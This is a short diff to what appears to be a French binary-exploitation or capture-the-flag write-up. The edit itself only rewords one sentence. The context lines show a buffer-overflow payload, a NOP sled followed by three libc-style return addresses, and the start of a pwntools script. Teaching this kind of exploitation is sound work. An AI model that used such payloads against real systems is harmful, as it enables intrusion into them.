@@ -244,7 +244,7 @@ Notre payload sera donc :
 
 `\x90 * 212 + \x60\xc0\xe4\xf7 +  \xf0\xfa\xe3\xf7 + \xd5\xdd\xf6\xf7`
 
-J'ai créer un script avec le module pwntools qui est très pratique en python :
+J'ai donc créer un script avec le module pwntools qui est très pratique en python :
 
 ```py
 from pwn import *
